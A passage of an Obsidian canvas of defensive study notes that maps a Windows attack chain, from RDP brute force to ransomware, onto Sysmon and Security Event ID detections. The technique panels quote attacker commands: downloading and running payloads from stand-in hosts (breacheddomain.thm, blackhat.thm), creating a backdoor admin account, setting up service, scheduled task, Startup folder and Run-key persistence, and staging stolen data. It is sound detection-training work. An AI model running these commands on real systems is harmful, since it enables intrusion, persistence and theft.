{
	"nodes":[
		{"id":"570c6469b4d24735","type":"text","x":0,"y":-481,"width":2120,"height":291,"text":"# 🛡️ Windows Threat Detection Map — Attack Chain → Detection\nEach stage maps **MITRE tactic → technique → detection mechanism (logs & Event IDs)**, in the order the course material presents it.\n\n**Chain:** Initial Access → Discovery → Collection (+ Credential Access) → Exfiltration → Ingress Tool Transfer → Command & Control → Persistence → Impact\n\n⏱️ Exfiltration and Ingress Tool Transfer can happen at **any** stage, not only where they sit in this chain.\n\n† = ATT&CK ID added by me for mapping; it is not stated in your source notes.","color":"6"},
		{"id":"ed49d9a463254f1b","type":"text","x":0,"y":-150,"width":300,"height":90,"text":"## 🟣 TACTIC","color":"6"},
		{"id":"a644e8cd64114c2c","type":"text","x":380,"y":-150,"width":520,"height":90,"text":"## 🔴 TECHNIQUE — what the attacker does","color":"1"},
		{"id":"da885d6c8a6d40cd","type":"text","x":980,"y":-150,"width":620,"height":90,"text":"## 🔵 DETECTION — logs & Event IDs","color":"5"},
		{"id":"b8f47bb1261f480f","type":"text","x":1680,"y":-150,"width":440,"height":90,"text":"## 🟡 PIVOTS & ANALYST NOTES","color":"3"},
		{"id":"82ce8818439c4a81","type":"group","x":-40,"y":0,"width":2200,"height":2032,"label":"① TA0001 · Initial Access"},
		{"id":"ffa2b6d6543b48bf","type":"text","x":0,"y":40,"width":300,"height":1952,"text":"## TA0001 Initial Access\nThe moment the attacker first gets through the front door.\n\n**Two families**\n- 🚪 Exposed services\n- 🧑‍💻 User-driven methods\n\nMedusa and Akira ransomware groups used **all** of these techniques at least once.","color":"6"},
		{"id":"a93054c69ffe471a","type":"text","x":380,"y":40,"width":520,"height":591,"text":"### 🚪 Exposed RDP → brute force → login\n**T1133** External Remote Services (exposed RDP/VNC/SSH with weak passwords)\n**T1190** Exploit Public-Facing Application (vulnerable or misconfigured web apps — no detection recipe in the source)\n\n**RDP case** — admin exposed RDP for weekend access, creds `Administrator:Summer2025`\n1. Botnet scans the IP and finds the open RDP port\n2. Brute force of common usernames (Administrator, admin, support…)\n3. After ~100 attempts the password is guessed → **Initial Access**\n4. ~2 hrs later the actor logs in via RDP and browses the Desktop\n\nRDP = *Ransomware Deployment Protocol* — 5M+ RDP hosts are exposed (Censys).","color":"1"},
		{"id":"770ee6d0d8aa43de","type":"text","x":980,"y":40,"width":620,"height":591,"text":"### 🔵 Security log (RDP-Security.evtx)\n**Brute force** — failed logons\n1. Filter Event ID **4625**\n2. LogonType **3** or **10** (remote)\n3. Source IP is **external**\n→ potential RDP brute force\n\n**Initial Access** — success\n1. Switch the filter to **4624**\n2. Read the **account** used\n\n**Further actions**\n1. 4624 with LogonType **10** (interactive RDP)\n2. Copy the **Logon ID**\n3. Search Sysmon for that Logon ID → every process the actor started over RDP\n\nStep 1 (network scan) is out of scope — network attacks.","color":"5"},
		{"id":"4651d54fc6164128","type":"text","x":1680,"y":40,"width":440,"height":591,"text":"### 🟡 Pivots\n- **Logon ID** is the bridge: Security 4624 → Sysmon process events\n- Hundreds of 4625s per second = botnet brute force you can't miss\n- RDP can be breached **without** brute force if the actor already knew the credentials — then there is no 4625 spike to catch\n- Query helper: [[Select-EventField]] (see cheat sheet at the bottom)","color":"3"},
		{"id":"e1927af39bbf4c60","type":"text","x":380,"y":671,"width":520,"height":313,"text":"### 📧 Phishing — binary attachment\n**T1566** Phishing · **T1036.007** Double file extension\n\n- Not only `.exe` — also **.com, .scr, .cpl**\n- Windows hides known extensions, so `invoice.pdf.exe` shows as `invoice.pdf`\n- `tryhatme.com` looks like a website, not a binary\n- Usually shipped inside a **.zip / .rar**","color":"1"},
		{"id":"701c084623ad4b6f","type":"text","x":980,"y":671,"width":620,"height":313,"text":"### 🔵 Sysmon event chain (double-extension attachment)\n1. **EID 1** — browser launched: `msedge.exe`, parent `Explorer.EXE`\n2. **EID 11** — archive lands in Downloads: `invoice.zip` (Image = browser)\n3. **EID 11** — user unpacks it: Image `Explorer.EXE` or `7zG.exe`, TargetFilename `invoice.pdf.exe`\n4. **EID 1** — user double-clicks: Image `...\\Downloads\\invoice.pdf.exe`, ParentImage `Explorer.EXE`","color":"5"},
		{"id":"807ab13c609646e7","type":"text","x":1680,"y":671,"width":440,"height":313,"text":"### 🟡 Pivots\n- User-driven attacks are best caught by **process execution** events, preferably Sysmon\n- Executable running from Downloads with an [[explorer.exe]] parent after a fresh archive download = the chain above\n- Remember: `Image` in EID 11 is the process that **created** the file","color":"3"},
		{"id":"14bc059afe414bcb","type":"text","x":380,"y":1024,"width":520,"height":534,"text":"### 🔗 Phishing — LNK shortcut\n**T1566** Phishing\n\n- Script (PowerShell / VBS / BAT) hidden behind a shortcut to dodge AV\n- Example: `Discounts.zip` holds a PDF and `Visit Our Website!.lnk`\n- Any command can sit in the LNK **Target** field, with any icon\n- Example payload: PowerShell downloads and runs a simplified RemcosRAT\n```\npowershell.exe -c ...\nDownloadFile('https://breacheddomain.thm/.../r.exe','C:\\ProgramData\\r.exe');\nstart C:\\ProgramData\\r.exe;\n```","color":"1"},
		{"id":"e5aedd33a67a4b7c","type":"text","x":980,"y":1024,"width":620,"height":534,"text":"### 🔵 LNK leaves little execution trace\n- LNK execution is **not logged** — PowerShell simply appears with an **`explorer.exe`** parent\n- Look **backwards**: **EID 11** — the `.lnk` file must have been created somewhere (Downloads)\n- **EID 1** — the suspicious child process (powershell, cmd...)\n\n| Data source | What you get |\n|---|---|\n| Sysmon EID 1 | process, parent, command line, user |\n| Sysmon EID 11 | created file path |\n| LNK parser / EDR | shortcut Target, arguments, metadata |\n\n⚠️ Sysmon alone cannot reliably inspect the LNK `Target` field.","color":"5"},
		{"id":"49f732f2068d4e7a","type":"text","x":1680,"y":1024,"width":440,"height":534,"text":"### 🟡 Recommended response policy\n- Suspicious process only → **medium**-confidence alert\n- Suspicious process + matching malicious LNK → **high** confidence\n- High confidence + active malicious execution → terminate the process, quarantine / disable the shortcut (per your response policy)","color":"3"},
		{"id":"1ae5c644436d4e48","type":"text","x":380,"y":1598,"width":520,"height":394,"text":"### 💾 Removable media (USB)\n**T1091** Removable Media\n\n- Bypasses the firewall, works with no Internet, can keep spreading without user action\n- Typical tricks:\n  - hide real files + create `RECOVERY.lnk`\n  - `Photos.exe` with a folder icon\n  - double-extension copies like `photo_2024_1_12.jpg.exe`\n- Cases: Camaro Dragon, Raspberry Robin, the \"gift from HR\" USB, an infected print-shop PC","color":"1"},
		{"id":"dd52d7ca04804eef","type":"text","x":980,"y":1598,"width":620,"height":394,"text":"### 🔵 Detection\n- Looks like phishing: the user launches it through the GUI, so the parent is **explorer.exe**\n- Look for **EID 1** where the process `Image` starts from a **non-C: drive**, e.g. `E:\\malware.exe`\n- Hunt for the filename tricks above (RECOVERY.lnk, double extensions)","color":"5"},
		{"id":"5090ea1daf24488a","type":"text","x":1680,"y":1598,"width":440,"height":394,"text":"### 🟡 Pivots\n- USB vs phishing is hard to separate from the process tree alone\n- The **drive letter in `Image`** is the giveaway","color":"3"},
		{"id":"8d0352e5208b48be","type":"group","x":-40,"y":2142,"width":2200,"height":1080,"label":"② TA0007 · Discovery"},
		{"id":"59ab13b591f74e53","type":"text","x":0,"y":2182,"width":300,"height":1000,"text":"## TA0007 Discovery\n\"Who am I? Where am I?\" The actor learns the host's purpose, user privileges, network and security tools.\n\nUsually happens **immediately after** Initial Access and is detectable with Sysmon.","color":"6"},
		{"id":"1165df8f01b5470a","type":"text","x":380,"y":2182,"width":520,"height":667,"text":"### ⌨️ Discovery from CMD / PowerShell\nBuilt-in commands only — nothing to download.\n\n- **Files & folders** (host purpose, victim's job): `type`, `Get-Content`, `dir`, `Get-ChildItem` · T1083†\n- **Users & groups** (who uses it, privileges): `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser` · T1033† T1087†\n- **System & apps** (vulns, apps to steal from): `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service` · T1082† T1057† T1007†\n- **Network** (corporate network?): `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles` · T1016† T1049†\n- **Active antivirus** (risk of being blocked): `Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Query \"SELECT * FROM AntivirusProduct\"` · T1518.001†\n\nMalware may **delete itself** if a specific AV is present or the victim isn't a target; otherwise it calls back to the actor.","color":"1"},
		{"id":"d0b12c28fbca40c3","type":"text","x":980,"y":2182,"width":620,"height":667,"text":"### 🔵 Sysmon EID 1 (or PowerShell history file)\n1. Find a **sequence** of discovery commands in a short window\n2. Find **where they come from** — rebuild the process tree by matching `ProcessId` ↔ `ParentProcessId`\n\n```\nexplorer.exe\n└── invoice.pdf.exe          <- the malware\n    ├── cmd.exe\n    │   ├── ipconfig\n    │   ├── whoami /priv\n    │   ├── dir\n    │   ├── net user\n    │   ├── tasklist /v\n    │   └── wmic computersystem get model\n    └── powershell.exe\n        ├── Get-Service\n        └── Get-MpPreference\n```","color":"5"},
		{"id":"f61b2625909d44c3","type":"text","x":1680,"y":2182,"width":440,"height":667,"text":"### 🟡 Analyst notes\n- `ipconfig` alone is often just IT or a legitimate tool — don't panic on one command\n- Judge by the **parent chain + burst timing**: malware as parent of `cmd.exe` / `powershell.exe` is the tell\n- Check PowerShell logging too — new rows in the PowerShell history file count as evidence","color":"3"},
		{"id":"ed1fbf2dd4414d8f","type":"text","x":380,"y":2889,"width":520,"height":293,"text":"### 🖱️ Discovery via GUI (after RDP / interactive logon)\nNo `whoami` here — the actor uses the same tools you do: Computer Management, Control Panel, Settings, Task Manager, Notepad, even Event Viewer.\n\nCMD is still possible out of habit.","color":"1"},
		{"id":"ca761cf605084d43","type":"text","x":980,"y":2889,"width":620,"height":293,"text":"### 🔵 Process tree for GUI discovery (EID 1)\n```\nexplorer.exe\n├── cmd.exe                  (attacker can still use CMD)\n├── mmc.exe compmgmt.msc     (Computer Management)\n├── control.exe netconnections\n├── SystemSettings.exe ...\n├── notepad.exe ...\\secrets.txt\n└── taskmgr.exe\n```","color":"5"},
		{"id":"19714eb029ea4fc9","type":"text","x":1680,"y":2889,"width":440,"height":293,"text":"### 🟡 Pivots\n- Tie these processes to the RDP **Logon ID** (type 10) from Initial Access to confirm it was the attacker's session","color":"3"},
		{"id":"3df44c67d5f54981","type":"group","x":-40,"y":3332,"width":2200,"height":940,"label":"③ TA0009 · Collection (+ TA0006 Credential Access)"},
		{"id":"be57450571bf4fb3","type":"text","x":0,"y":3372,"width":300,"height":860,"text":"## TA0009 Collection\n## + TA0006 Credential Access\nGrab the treasure. Credential Access is treated as part of Collection for simplicity.\n\nSecrets live in files, the **registry** and **process memory**.","color":"6"},
		{"id":"69bed0cb3da845ad","type":"text","x":380,"y":3372,"width":520,"height":452,"text":"### 🎯 What gets collected — and by whom\n- **Blackmail:** `AppData\\Roaming\\Signal\\*`, Chrome `History`\n- **Steal money:** `AppData\\Roaming\\Bitcoin\\wallet.dat`, Chrome `Cookies` (web-banking sessions)\n- **Corporate data:** `.ssh\\*`, SQL Server `DATA\\*`\n\n**Human operator** (big networks): hours of reviewing files — e.g. BlackSuit used Notepad and Wordpad, then 7-Zip to archive everything.\nLocal data T1005† · archiving T1560†","color":"1"},
		{"id":"3ff188e079da43b7","type":"text","x":980,"y":3372,"width":620,"height":452,"text":"### 🔵 Sysmon EID 1 — process creation + command line\n- `notepad.exe C:\\Users\\<user>\\Desktop\\finances-2025.csv` → reading a file\n- `type debug-logs.txt | findstr password > C:\\Temp\\passwords.txt` → keyword hunt\n- `Get-ChildItem C:\\Users\\<user> -Recurse -Filter *.pdf` → file hunting\n- `copy C:\\Users\\<user>\\AppData\\Roaming\\Signal C:\\Temp\\` → staging\n- `Compress-Archive C:\\Temp\\ C:\\Temp\\stolen_data.zip` → archiving\n- `7za.exe a -tzip C:\\Temp\\stolen_data.zip C:\\Temp\\*.*` → archiving with existing software\n\nMany Notepad / Wordpad processes opening financial docs = manual collection (BlackSuit).","color":"5"},
		{"id":"5d4e01223abc423b","type":"text","x":1680,"y":3372,"width":440,"height":452,"text":"### 🟡 Pivots\n- Collection looks for **specific files and folders**, unlike Discovery which checks system configuration\n- The archive in `C:\\Temp` is the staging signal before Exfiltration\n- Works from CMD *and* GUI sessions","color":"3"},
		{"id":"65cc254a87cc4fc3","type":"text","x":380,"y":3864,"width":520,"height":368,"text":"### 🕷️ Automated data stealers\nOne malicious file collects **and** exfiltrates, usually in under a minute.\n\nExample: **Gremlin** steals VPN profiles, crypto wallets, browser sessions, Steam / Discord / Telegram data and takes screenshots.\n\nTypical for personal workstations — rarely a human operator. Short lifespan: breach → collect → exfiltrate → exit, all within minutes.","color":"1"},
		{"id":"f52578c2e2fb4578","type":"text","x":980,"y":3864,"width":620,"height":368,"text":"### 🔵 Detection is harder\n- Stealers rarely use CMD or PowerShell — they run their **own code** (e.g. C#)\n- So you often cannot tell exactly **which data** was accessed or stolen\n- Rely on the surrounding chain: Initial Access process → outbound connection (see Exfiltration)","color":"5"},
		{"id":"9c12e5a237114115","type":"text","x":1680,"y":3864,"width":440,"height":368,"text":"### 🟡 Notes\n- Data stealers usually skip Persistence entirely — a short, loud burst of activity, then gone","color":"3"},
		{"id":"52c9f76cac424ccc","type":"group","x":-40,"y":4382,"width":2200,"height":422,"label":"④ TA0010 · Exfiltration"},
		{"id":"9d63e435821946fa","type":"text","x":0,"y":4422,"width":300,"height":342,"text":"## TA0010 Exfiltration\nUpload the stolen data to a server the actor controls.\n\n⏱️ Can happen at **any** time during the attack.","color":"6"},
		{"id":"a0681151c6d94e40","type":"text","x":380,"y":4422,"width":520,"height":342,"text":"### 📤 Where the data goes\n**T1567.002** Exfiltration to Cloud Storage\n\n- Trusted cloud storage: Dropbox, Mega, Amazon S3\n- Code repositories and messengers: GitHub, Telegram\n- Or just a trustworthy-looking lookalike domain such as `windows-updates.com`","color":"1"},
		{"id":"4fa2d5a1eccb4e15","type":"text","x":980,"y":4422,"width":620,"height":342,"text":"### 🔵 Detection\n- The source gives no dedicated exfiltration recipe; apply the **network approach** used for tool transfer:\n  - **Sysmon EID 3** network connection / DNS request from the suspicious process\n  - Which **process** connects, to which **destination**, and what is sent\n- Look upstream for the staged archive (`stolen_data.zip`, EID 11 / archiver command lines)","color":"5"},
		{"id":"4ef2de17c4674447","type":"text","x":1680,"y":4422,"width":440,"height":342,"text":"### 🟡 Pivots\n- Legit services (GitHub, Dropbox, Telegram) are abused to blend in — judge the **process + purpose**, not the domain's reputation alone","color":"3"},
		{"id":"65d3b1a82c6d4314","type":"group","x":-40,"y":4914,"width":2200,"height":629,"label":"⑤ T1105 · Ingress Tool Transfer  (MITRE tactic: Command & Control)"},
		{"id":"aac69f66213f4b83","type":"text","x":0,"y":4954,"width":300,"height":549,"text":"## T1105 Ingress Tool Transfer\nDownload **more** malware only when needed:\n- Seatbelt-style discovery scripts\n- Mimikatz (credentials)\n- A RAT such as Remcos\n- Finally, the ransomware binary\n\nWhy split it? To bypass AV and limit exposure if caught early.\n\n⏱️ Any stage, used in the majority of breaches.","color":"6"},
		{"id":"8eb156d400784bae","type":"text","x":380,"y":4954,"width":520,"height":549,"text":"### 📥 Common transfer methods\n- **Certutil:** `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe`\n- **Curl** (Windows 10+): `curl.exe https://blackhat.thm/bad.exe -o good.exe`\n- **PowerShell IWR:** `powershell -c \"Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'\"`\n- **GUI:** copy-paste the malware over RDP, or download it in a browser — no CMD needed","color":"1"},
		{"id":"4d8d4b9f79c54caa","type":"text","x":980,"y":4954,"width":620,"height":549,"text":"### 🔵 Detection — a transfer needs a network connection\n- Track a **network connection** or **DNS request** from the suspicious process (**Sysmon EID 3**)\n- Analyze: which process, which destination domain, which file was downloaded\n- Full event chain: `cmd.exe` launched → `curl.exe` started → connection to the malicious domain → file written to a folder\n- Plus **EID 1** for the command line and **EID 11** for the dropped file","color":"5"},
		{"id":"a2a0a810b89947ab","type":"text","x":1680,"y":4954,"width":440,"height":549,"text":"### 🟡 Pivots\n- Actors download from legit services like GitHub, so the domain alone proves little — check process, destination and file together\n- Certutil, curl and PowerShell are built in: no extra malware needed to fetch malware","color":"3"},
		{"id":"cf8b55a6b0564557","type":"group","x":-40,"y":5653,"width":2200,"height":454,"label":"⑥ TA0011 · Command & Control"},
		{"id":"f447d4723b4246ea","type":"text","x":0,"y":5693,"width":300,"height":374,"text":"## TA0011 Command & Control\nHow the actor sends commands and keeps control of the victim.\n\nSome attacks need **no C2**: after an RDP breach the actor just types in the session. But RDP can be closed, so most still set up C2 right away.","color":"6"},
		{"id":"9f740423654c48ba","type":"text","x":380,"y":5693,"width":520,"height":374,"text":"### 📡 Simplest C2\nThe phishing attachment itself connects back and waits for commands 24/7 (e.g. Cobalt Strike).\n\n### 🕶️ More advanced\nThe attachment instead downloads a **second-stage C2 malware**, hides it in a folder like `C:\\Temp`, and runs it as a new stealthy process — the attack survives even if the victim deletes the original attachment.\nSeen in ransomware cases and the APT29 phishing campaign.","color":"1"},
		{"id":"a74bd683b5cd42ed","type":"text","x":980,"y":5693,"width":620,"height":374,"text":"### 🔵 Detection\n- The source gives no dedicated C2 recipe. C2 shows up as a process making **outbound connections** (Sysmon EID 3, `Image` = that process)\n- Network logs may reveal the C2 connection **before** endpoint logs show the malicious process\n- Follow the chain: tool dropped (EID 11, e.g. in `C:\\Temp`) → new process (EID 1) → outbound connection (EID 3)","color":"5"},
		{"id":"7dc6ab4d4a114cfe","type":"text","x":1680,"y":5693,"width":440,"height":374,"text":"### 🟡 Pivots\n- The C2 process is either the original Initial Access binary or a dropped second stage — walk the process tree from Initial Access to find it","color":"3"},
		{"id":"ecff57eebbbe4294","type":"group","x":-40,"y":6217,"width":2200,"height":1998,"label":"⑦ TA0003 · Persistence"},
		{"id":"e520b14a35684a56","type":"text","x":0,"y":6257,"width":300,"height":1918,"text":"## TA0003 Persistence\nReliable long-term access that survives **reboots and password changes**.\n\n**Why attackers bother**\n- Add the host to a botnet (Kraken)\n- Spy for a state-sponsored campaign (Volt Typhoon, ~1 year undetected)\n- Use the victim as a network entry point (IcedID → Dagon Locker took 29 days)","color":"6"},
		{"id":"4318019b06364bc4","type":"text","x":380,"y":6257,"width":520,"height":507,"text":"### 👤 Backdoor account (exposed-service persistence)\n**T1136** Create Account · **T1098.007** Add to local / domain groups · **T1505.003** Web shell (hidden hole in the breached service)\n\n```\nnet user \"mr.backd00r\" \"p@ssw0rd!\" /add\nNew-LocalUser \"mr.backd00r\" -Password [...]\nnet localgroup Administrators \"mr.backd00r\" /add\nAdd-LocalGroupMember \"Administrators\" -Member \"mr.backd00r\"\n```\n- GUI: Computer Management or `lusrmgr.msc`\n- A new user alone is useless: it needs **Administrators** or **Remote Desktop Users**\n- Or reset the password of an old / unused account instead","color":"1"},
		{"id":"5374ac24fc1941fd","type":"text","x":980,"y":6257,"width":620,"height":507,"text":"### 🔵 Security log\n- **4720** created · 4722 enabled · 4738 changed\n- **4732** added to a security group (Administrators, Remote Desktop Users) · 4733 removed\n- **4724** password reset · 4723 user changed own password\n- 4725 / 4726 disabled / deleted — actors may disable privileged SOC accounts\n\n**Don't rely on suspicious names — ask:**\n1. **Who** created the account? Can they confirm it?\n2. **What** source IP and time did the creator log in from? Expected?\n3. **Which** other suspicious events are in the creator's session?","color":"5"},
		{"id":"7cb9a5be9da3443d","type":"text","x":1680,"y":6257,"width":440,"height":507,"text":"### 🟡 Event anatomy (4720 / 4732 / 4724)\n1. **Subject** — the account doing the action; its **Logon ID** correlates with the preceding 4624\n2. **Object** (New Account / Member) — the target\n3. **Details** — target group (4732/4733) or new-user attributes (4720)\n\nWeb-shell detection is not covered in the source.","color":"3"},
		{"id":"bb65f6c6d86d4a27","type":"text","x":380,"y":6804,"width":520,"height":254,"text":"### ⚙️ Windows service\n**T1543.003** Windows Service\n\n`sc create \"BadService\" binpath= \"C:\\malware.exe\" start= auto`\n\n- Needs admin; runs after OS startup\n- Manage via `services.msc` or `sc.exe`","color":"1"},
		{"id":"ae7533e09f914439","type":"text","x":980,"y":6804,"width":620,"height":254,"text":"### 🔵 Three ways to detect\n1. **Sysmon EID 1** — launch of `sc.exe create`\n2. **Security 4697** or **System 7045** — service installed\n3. Suspicious process with a **`services.exe`** parent → [[services.exe]]","color":"5"},
		{"id":"8aa9bd1264d549ca","type":"text","x":1680,"y":6804,"width":440,"height":254,"text":"### 🟡 Pivots\n- A binary path in a user-writable location (`C:\\malware.exe`) is the red flag\n- Check `ImagePath` / `ServiceDll` — see [[The two ways a Windows service can run]]","color":"3"},
		{"id":"bf2916fe499a4423","type":"text","x":380,"y":7098,"width":520,"height":312,"text":"### ⏰ Scheduled task\n**T1053.005**†\n\n`schtasks /create /tn \"BadTask\" /tr \"C:\\malware.exe\" /sc onstart /ru System`\n\n- The **most common** persistence method (APT28, APT41): easy to configure and hide\n- GUI: `taskschd.msc` · CLI: `schtasks.exe`","color":"1"},
		{"id":"dcba72f8cea34af2","type":"text","x":980,"y":7098,"width":620,"height":312,"text":"### 🔵 Three ways to detect\n1. **Sysmon EID 1** — launch of `schtasks.exe /create`\n2. **Security 4698** — scheduled task created\n3. Suspicious process with a **`svchost.exe ... -s Schedule`** parent → [[svchost.exe]]","color":"5"},
		{"id":"20b7f0aab8844618","type":"text","x":1680,"y":7098,"width":440,"height":312,"text":"### 🟡 Pivots\n- Tasks run under the Schedule service hosted in svchost — check which `-s Schedule` svchost spawned the unknown child","color":"3"},
		{"id":"bfafab9b0b7a4678","type":"text","x":380,"y":7450,"width":520,"height":373,"text":"### 📁 Startup folder (per-user, on login)\n**T1547.001** Registry Run Keys / Startup Folder\n\n`copy C:\\malware.exe \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe\"`\n\n- User: `C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\`\n- All users: `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp`\n- Seen with Lumma Stealer","color":"1"},
		{"id":"0f9a639b9c364259","type":"text","x":980,"y":7450,"width":620,"height":373,"text":"### 🔵 Detection\n- **Sysmon EID 11** — file created inside the Startup folder\n- The folder is normally **empty** — legit programs rarely use it, so anything new stands out\n- At login the program runs with an **`explorer.exe`** parent, so it blends in with normal user activity","color":"5"},
		{"id":"dd58f8b6140240d2","type":"text","x":1680,"y":7450,"width":440,"height":373,"text":"### 🟡 Pivots\n- Anchor on the **file-creation event** (EID 11), not the later process start\n- Same parent pattern as the user shell startup — see [[explorer.exe]]","color":"3"},
		{"id":"5df8d6d9d0404987","type":"text","x":380,"y":7863,"width":520,"height":312,"text":"### 🗝️ Registry Run keys (per-user, on login)\n**T1547.001** — same technique as the Startup folder\n\n`reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v BadKey /t REG_SZ /d \"C:\\malware.exe\"`\n\n- `HKCU\\...\\CurrentVersion\\Run` (user) · `HKLM\\...\\CurrentVersion\\Run` (all users)\n- View with `regedit.exe`","color":"1"},
		{"id":"cee2807bc0894aff","type":"text","x":980,"y":7863,"width":620,"height":312,"text":"### 🔵 Detection\n- **Sysmon EID 13** — registry value set affecting the Run keys\n- Read the **new value's data** to see which program will launch","color":"5"},
		{"id":"671701f211524384","type":"text","x":1680,"y":7863,"width":440,"height":312,"text":"### 🟡 Pivots\n- In EID 13, `Image` is the process that **modified** the value — not the program being persisted\n- Services and tasks usually need admin; Startup folder and Run keys fire only when that **specific user** logs in","color":"3"},
		{"id":"9c57bb18a6884412","type":"group","x":-40,"y":8325,"width":2200,"height":411,"label":"⑧ TA0040 · Impact"},
		{"id":"ba60e81da98943e1","type":"text","x":0,"y":8365,"width":300,"height":331,"text":"## TA0040 Impact\nThe end of the chain: **ransomware** (T1486†).\n\nIn Active Directory networks it can halt an entire company — McLaren hospitals: 743,000 patients affected, ransom notes printed on every printer.","color":"6"},
		{"id":"649a2461385447ca","type":"text","x":380,"y":8365,"width":520,"height":331,"text":"### 💥 Ransomware\n- Servers encrypted, data stolen, ransom notes printed automatically\n- One breached host can become a domain-wide event (IcedID → Dagon Locker in 29 days)\n- Defenders' goal: detect and stop the chain **right after Initial Access**, before Impact","color":"1"},
		{"id":"9decd7ceda744720","type":"text","x":980,"y":8365,"width":620,"height":331,"text":"### 🔵 Detection\n⚠️ **Not covered in your source notes.** Active Directory and ransomware are separate topics.\n\nPlaceholder — add ransomware detections here as you learn them.","color":"5"},
		{"id":"87138fd144bf4b52","type":"group","x":-40,"y":8846,"width":2200,"height":1507,"label":"📚 Detection Cheat Sheets"},
		{"id":"55a5ba8c2f514105","type":"text","x":0,"y":8886,"width":1040,"height":990,"text":"## 📚 Event ID quick reference\n\n**Security log**\n| ID | Meaning | Hunting use |\n|---|---|---|\n| 4624 | Successful logon | Initial Access account; LogonType 10 = RDP, 3 = network |\n| 4625 | Failed logon | Brute force (LogonType 3/10, external IP) |\n| 4688 | Process creation (if auditing is on) | Parent / child chain when Sysmon is missing |\n| 4720 / 4722 / 4738 | User created / enabled / changed | Backdoor account |\n| 4723 / 4724 | User changed own password / password reset | Taking over an old account |\n| 4725 / 4726 | User disabled / deleted | Disabling SOC or privileged accounts |\n| 4732 / 4733 | Added to / removed from a security group | Backdoor added to Administrators / Remote Desktop Users |\n| 4697 (System 7045) | Service installed | Service persistence |\n| 4698 | Scheduled task created | Task persistence |\n\n**Sysmon**\n| ID | Meaning | Seen in |\n|---|---|---|\n| 1 | Process create | Every stage: process tree, command lines, parents |\n| 3 | Network connection | Tool transfer, C2, exfiltration |\n| 11 | File create | Downloads, Startup folder, dropped tools, LNK files |\n| 13 | Registry value set | Run keys |","color":"5"},
		{"id":"f169437486b24512","type":"text","x":1100,"y":8886,"width":1040,"height":990,"text":"## 🔍 Sysmon `Image` field depends on the Event ID\n| Event | What `Image` represents |\n|---|---|\n| 1 — Process Create | The executable that was started |\n| 3 — Network Connection | The process associated with the connection |\n| 7 — Image Loaded | The process the module was loaded into |\n| 9 — Raw Access Read | The process that performed the raw disk read |\n| 11 — File Create | The process that **created the file** |\n| 13 — Registry Value Set | The process that **modified the value** |\n\n**Logon types to memorize**\n- **3** — network (remote)\n- **10** — interactive RDP\n\nSource: [[Hunting Threats Methodology]]","color":"5"},
		{"id":"ff7e06b9a1b34a78","type":"text","x":0,"y":9916,"width":1040,"height":397,"text":"## 🧰 Select-EventField — pull key fields fast\n```powershell\nGet-WinEvent -Path \"Practice-Security.evtx\" -FilterXPath '*/System/EventID=4624 and */System/Computer=\"THM-PC\" and (*/EventData/Data[@Name=\"LogonType\"]=\"3\" or */EventData/Data[@Name=\"LogonType\"]=\"10\")' | Select-EventField -Fields TargetUserName,IpAddress,TargetLogonId,LogonType\n```\nRemote successful logons (types 3 and 10) → who, from where, which Logon ID. See [[Select-EventField]].\n\n**Anatomy of 4720 / 4732 / 4724**\n1. **Subject** — account doing the action; its **Logon ID** ties back to the preceding 4624\n2. **Object** (New Account / Member) — the target\n3. **Details** — target group (4732/4733) or new-user attributes (4720)","color":"3"},
		{"id":"4aaa1186f8c940de","type":"text","x":1100,"y":9916,"width":1040,"height":397,"text":"## ✅ Golden rules (from the recap)\n- Discovery usually happens right after Initial Access and shows up in Sysmon\n- Discovery identifies the **victim**; Collection acquires the **data**\n- At any time actors can exfiltrate data or download new malware\n- Actors don't start with every tool — they download more only when needed\n- Most common Windows Initial Access: **exposed services** and **user-driven** attacks\n- RDP Initial Access is visible in default auth logs (**4624 / 4625**)\n- User-driven attacks are best caught by **process execution** events, preferably Sysmon\n- Group logs by **Logon ID** and **Process ID** to see the attack chain quickly\n- Learn Sysmon and use it — most context; don't forget **PowerShell logging**","color":"4"}
	],
